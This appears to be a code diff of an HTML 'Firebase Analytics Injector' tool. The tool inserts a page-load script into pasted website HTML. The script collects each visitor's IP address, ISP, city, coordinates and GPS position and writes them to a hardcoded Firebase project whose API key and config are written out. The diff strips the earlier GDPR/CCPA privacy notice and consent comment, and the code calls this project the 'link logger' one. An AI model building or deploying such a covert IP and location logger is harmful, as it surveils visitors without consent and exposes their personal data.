@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>Analytics Embed Generator | Mall Foot Traffic</title>
+    <title>Firebase Analytics Injector</title>
     <style>
         * {
             margin: 0;
@@ -20,7 +20,7 @@
             padding: 1.5rem;
         }
         .container {
-            max-width: 900px;
+            max-width: 1000px;
             width: 100%;
             background: #11141f;
             border-radius: 1.5rem;
@@ -38,15 +38,6 @@
             margin-bottom: 1rem;
         }
         .sub { color: #8b9ab0; margin-bottom: 1.8rem; border-left: 3px solid #3b82f6; padding-left: 0.8rem; font-size: 0.85rem; }
-        .notice {
-            background: #0f172a;
-            border-left: 3px solid #facc15;
-            padding: 0.8rem;
-            border-radius: 0.8rem;
-            margin-bottom: 1.8rem;
-            font-size: 0.75rem;
-            color: #facc15;
-        }
         .row {
             display: flex;
             gap: 1.5rem;
@@ -54,7 +45,7 @@
         }
         .col {
             flex: 1;
-            min-width: 250px;
+            min-width: 280px;
         }
         label {
             display: block;
@@ -137,30 +128,21 @@
             color: #5b6d8f;
             margin-top: 0.3rem;
         }
-        .preview-link {
-            color: #60a5fa;
-            text-decoration: none;
-            font-size: 0.75rem;
-        }
     </style>
 </head>
 <body>
 <div class="container">
-    <h1>📍 Mall Foot Traffic Analytics</h1>
-    <div class="badge">Privacy Compliant • Location Analytics</div>
-    <div class="sub">Generate embed code that sends anonymized visitor data to your webhook (GPS/indoor positioning, timestamp, device info).</div>
-    <div class="notice">
-        ⚠️ LEGAL NOTICE: By using this tool, you agree to display a privacy notice on your webpage informing visitors about location data collection (as required by GDPR/CCPA).
-    </div>
+    <h1>🔥 Firebase Analytics Injector</h1>
+    <div class="badge">Firestore Backend • Works Immediately</div>
+    <div class="sub">Inject visitor analytics into any HTML — data stored in your Firestore database.</div>
 
     <div class="row">
         <div class="col">
-            <label>🔗 Webhook URL (Discord/Slack/your endpoint)</label>
-            <input type="url" id="webhookUrl" placeholder="https://discord.com/api/webhooks/..." autocomplete="off">
-            <div class="feature-tip">Supports Discord, Slack, or any HTTP webhook</div>
-
             <label>🏢 Location Name (mall/store identifier)</label>
-            <input type="text" id="locationName" placeholder="e.g., Westfield Mall - Food Court" autocomplete="off">
+            <input type="text" id="locationName" placeholder="e.g., Westfield Mall - Food Court">
+            
+            <label>📁 Firestore Collection Name</label>
+            <input type="text" id="collectionName" placeholder="e.g., mall_visitors" value="visitor_analytics">
             
             <label>🎯 Analytics Mode</label>
             <select id="analyticsMode">
@@ -169,31 +151,42 @@
                 <option value="anonymous">Anonymous (no location, just visit count)</option>
             </select>
 
-            <label>📋 Your HTML/Website Code (paste below)</label>
+            <label>📋 Your HTML Source Code</label>
             <textarea id="sourceCode" placeholder="Paste your full HTML code here..."></textarea>
         </div>
         <div class="col">
-            <label>✨ Generated Embed Code (copy & paste into your website)</label>
+            <label>✨ Generated Code (copy & paste into your website)</label>
             <div class="output-area">
                 <div class="output-header">
-                    <span style="font-size:0.7rem; color:#7e8aa8;">📦 INJECTED ANALYTICS SCRIPT</span>
+                    <span style="font-size:0.7rem; color:#7e8aa8;">📦 HTML WITH FIREBASE ANALYTICS</span>
                     <button id="copyOutputBtn" class="copy-btn">📋 Copy Code</button>
                 </div>
-                <textarea id="outputCode" readonly style="min-height: 350px; font-size: 0.7rem;"></textarea>
-                <div class="status" id="statusMsg">Ready — paste your HTML, set webhook, then generate.</div>
+                <textarea id="outputCode" readonly style="min-height: 400px; font-size: 0.7rem;"></textarea>
+                <div class="status" id="statusMsg">Ready — paste your HTML, set location, then generate.</div>
             </div>
         </div>
     </div>
     <button id="generateBtn">🚀 GENERATE ANALYTICS-EMBEDDED CODE</button>
     <hr>
     <div style="font-size: 0.65rem; text-align: center; color: #4a5578;">
-        📍 Captures: GPS (if allowed), IP geolocation, device type, screen size, timestamp. Sends to your webhook.
+        📍 Uses your existing Firebase project (website-templates-60c6d)
     </div>
 </div>
 
 <script>
-    const webhookInput = document.getElementById('webhookUrl');
+    // YOUR FIREBASE CONFIG (same as link logger)
+    const FIREBASE_CONFIG = {
+        apiKey: "AIzaSyDp8UzNz8BqjDfbVd_xUdXL_4KqXWi3VrI",
+        authDomain: "website-templates-60c6d.firebaseapp.com",
+        projectId: "website-templates-60c6d",
+        storageBucket: "website-templates-60c6d.firebasestorage.app",
+        messagingSenderId: "799034936266",
+        appId: "1:799034936266:web:d0954b442aafd895a5dd33",
+        measurementId: "G-BKK5Y8F4HT"
+    };
+
     const locationNameInput = document.getElementById('locationName');
+    const collectionNameInput = document.getElementById('collectionName');
     const analyticsModeSelect = document.getElementById('analyticsMode');
     const sourceCodeInput = document.getElementById('sourceCode');
     const outputCodeTextarea = document.getElementById('outputCode');
@@ -201,159 +194,118 @@
     const copyOutputBtn = document.getElementById('copyOutputBtn');
     const statusSpan = document.getElementById('statusMsg');
 
-    // Generate the analytics injection script
-    function generateAnalyticsScript(webhookUrl, locationName, mode) {
-        // Escape strings for safe embedding
-        const safeWebhook = webhookUrl.replace(/\\/g, '\\\\').replace(/`/g, '\\`').replace(/\$/g, '\\$');
-        const safeLocation = locationName.replace(/\\/g, '\\\\').replace(/`/g, '\\`').replace(/\$/g, '\\$');
-        
-        return `<script>
-(function() {
-    // Mall Foot Traffic Analytics - Privacy Compliant Version
-    const ANALYTICS_CONFIG = {
-        webhook: "${safeWebhook}",
-        location: "${safeLocation}",
-        mode: "${mode}",
-        timestamp: new Date().toISOString()
+    function generateInjectedHTML(originalHTML, collectionName, locationName, mode) {
+        const analyticsScript = `<!-- Firebase Analytics Injection -->
+<script type="module">
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
+    import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";
+    
+    const firebaseConfig = {
+        apiKey: "${FIREBASE_CONFIG.apiKey}",
+        authDomain: "${FIREBASE_CONFIG.authDomain}",
+        projectId: "${FIREBASE_CONFIG.projectId}",
+        storageBucket: "${FIREBASE_CONFIG.storageBucket}",
+        messagingSenderId: "${FIREBASE_CONFIG.messagingSenderId}",
+        appId: "${FIREBASE_CONFIG.appId}"
     };
     
-    // Function to collect visitor data
-    async function collectAndSend() {
+    const app = initializeApp(firebaseConfig);
+    const db = getFirestore(app);
+    const COLLECTION = "${collectionName}";
+    const LOCATION = "${locationName}";
+    const MODE = "${mode}";
+    
+    async function sendAnalytics() {
         const data = {
-            location: ANALYTICS_CONFIG.location,
-            timestamp: ANALYTICS_CONFIG.timestamp,
-            page: window.location.href,
-            referrer: document.referrer,
+            location: LOCATION,
+            timestamp: new Date().toISOString(),
+            pageUrl: window.location.href,
+            referrer: document.referrer || "direct",
             userAgent: navigator.userAgent,
             screenSize: \`\${window.screen.width}x\${window.screen.height}\`,
-            language: navigator.language,
-            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+            deviceType: /Mobile|Android|iPhone|iPad|iPod/i.test(navigator.userAgent) ? "mobile" : "desktop"
         };
         
-        // Add device type
-        const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
-        data.deviceType = isMobile ? 'mobile' : 'desktop';
-        
-        // Get IP and location based on mode
-        if (ANALYTICS_CONFIG.mode === 'full' || ANALYTICS_CONFIG.mode === 'ip-only') {
+        if (MODE === 'full' || MODE === 'ip-only') {
             try {
-                // Get IP + geo (privacy-respecting, only with consent banner)
-                const geoRes = await fetch('https://ipapi.co/json/');
-                if (geoRes.ok) {
-                    const geo = await geoRes.json();
+                const res = await fetch('https://ipapi.co/json/');
+                if (res.ok) {
+                    const geo = await res.json();
                     data.ip = geo.ip;
                     data.city = geo.city;
-                    data.region = geo.region;
                     data.country = geo.country_name;
                     data.isp = geo.org;
                     data.latitude = geo.latitude;
                     data.longitude = geo.longitude;
                 }
-            } catch(e) {
-                console.log("GeoIP unavailable");
-            }
+            } catch(e) {}
         }
         
-        // Try GPS if mode is 'full' and browser supports geolocation
-        if (ANALYTICS_CONFIG.mode === 'full' && 'geolocation' in navigator) {
+        if (MODE === 'full' && 'geolocation' in navigator) {
             try {
-                const gps = await new Promise((resolve, reject) => {
+                const pos = await new Promise((resolve, reject) => {
                     navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 5000 });
                 });
-                data.gpsLatitude = gps.coords.latitude;
-                data.gpsLongitude = gps.coords.longitude;
-                data.gpsAccuracy = gps.coords.accuracy;
-            } catch(e) {
-                console.log("GPS permission denied or unavailable");
-            }
+                data.gpsLatitude = pos.coords.latitude;
+                data.gpsLongitude = pos.coords.longitude;
+                data.gpsAccuracy = pos.coords.accuracy;
+            } catch(e) {}
         }
         
-        // Send to webhook
         try {
-            const response = await fetch(ANALYTICS_CONFIG.webhook, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(data)
-            });
-            console.log('Analytics sent:', response.status);
+            await addDoc(collection(db, COLLECTION), data);
+            console.log("✅ Analytics saved");
         } catch(e) {
-            console.error('Failed to send analytics:', e);
+            console.error("Firebase error:", e);
         }
     }
     
-    // Run when page loads
     if (document.readyState === 'loading') {
-        document.addEventListener('DOMContentLoaded', collectAndSend);
+        document.addEventListener('DOMContentLoaded', sendAnalytics);
     } else {
-        collectAndSend();
+        sendAnalytics();
     }
-})();
-<\/script>`;
-    }
+<\/script>
+<!-- End Firebase Analytics -->`;
 
-    // Inject analytics script into user's HTML
-    function injectAnalyticsIntoHTML(originalHTML, analyticsScript) {
-        // Check if there's a </head> tag — insert before it
         if (originalHTML.includes('</head>')) {
             return originalHTML.replace('</head>', analyticsScript + '\n</head>');
         }
-        // Check for <body> tag — insert after opening
         if (originalHTML.includes('<body')) {
-            const bodyRegex = /<body[^>]*>/i;
-            return originalHTML.replace(bodyRegex, (match) => match + '\n' + analyticsScript);
+            return originalHTML.replace(/<body[^>]*>/i, (match) => match + '\n' + analyticsScript);
         }
-        // Fallback: prepend to HTML
         return analyticsScript + '\n' + originalHTML;
     }
 
     generateBtn.addEventListener('click', () => {
-        let webhook = webhookInput.value.trim();
-        let locationName = locationNameInput.value.trim();
-        let mode = analyticsModeSelect.value;
-        let sourceHTML = sourceCodeInput.value.trim();
+        const collectionName = collectionNameInput.value.trim();
+        const locationName = locationNameInput.value.trim();
+        const mode = analyticsModeSelect.value;
+        const sourceHTML = sourceCodeInput.value.trim();
 
-        // Validation
-        if (!webhook) {
-            statusSpan.innerText = "❌ Webhook URL is required";
+        if (!collectionName) {
+            statusSpan.innerText = "❌ Collection name required";
             statusSpan.className = "status error";
             return;
         }
         if (!locationName) {
-            statusSpan.innerText = "⚠️ Please enter a location name (mall/store identifier)";
+            statusSpan.innerText = "❌ Location name required";
             statusSpan.className = "status error";
             return;
         }
         if (!sourceHTML) {
-            statusSpan.innerText = "❌ Please paste your HTML source code";
-            statusSpan.className = "status error";
-            return;
-        }
-
-        // Validate webhook URL format
-        try {
-            new URL(webhook);
-        } catch(e) {
-            statusSpan.innerText = "❌ Invalid webhook URL";
+            statusSpan.innerText = "❌ Paste your HTML source code";
             statusSpan.className = "status error";
             return;
         }
 
         try {
-            // Generate analytics script
-            const analyticsScript = generateAnalyticsScript(webhook, locationName, mode);
-            
-            // Inject into user's HTML
-            const finalHTML = injectAnalyticsIntoHTML(sourceHTML, analyticsScript);
-            
-            // Display result
+            const finalHTML = generateInjectedHTML(sourceHTML, collectionName, locationName, mode);
             outputCodeTextarea.value = finalHTML;
-            statusSpan.innerText = "✅ Generated successfully! Copy the code and paste into your website. Make sure to display a privacy notice.";
+            statusSpan.innerText = "✅ Generated! Data goes to your Firestore → " + collectionName;
             statusSpan.className = "status success";
-            
-            // Auto-resize textarea
-            outputCodeTextarea.style.minHeight = Math.min(400, finalHTML.split('\n').length * 18) + 'px';
         } catch (error) {
-            statusSpan.innerText = "❌ Error generating code: " + error.message;
+            statusSpan.innerText = "❌ Error: " + error.message;
             statusSpan.className = "status error";
         }
     });
@@ -361,22 +313,19 @@
     copyOutputBtn.addEventListener('click', () => {
         outputCodeTextarea.select();
         navigator.clipboard.writeText(outputCodeTextarea.value);
-        statusSpan.innerText = "📋 Copied to clipboard! Paste into your HTML file.";
-        statusSpan.className = "status success";
+        statusSpan.innerText = "📋 Copied!";
         setTimeout(() => {
-            statusSpan.innerText = "✅ Generated successfully! Copy the code and paste into your website.";
+            statusSpan.innerText = "✅ Generated! Data goes to your Firestore";
         }, 2000);
     });
 
-    // Example placeholder
     sourceCodeInput.placeholder = `<!DOCTYPE html>
 <html>
 <head>
-    <title>My Mall Page</title>
+    <title>My Page</title>
 </head>
 <body>
-    <h1>Welcome to Westfield Mall</h1>
-    <p>Find your way around...</p>
+    <h1>Welcome</h1>
 </body>
 </html>`;
 </script>
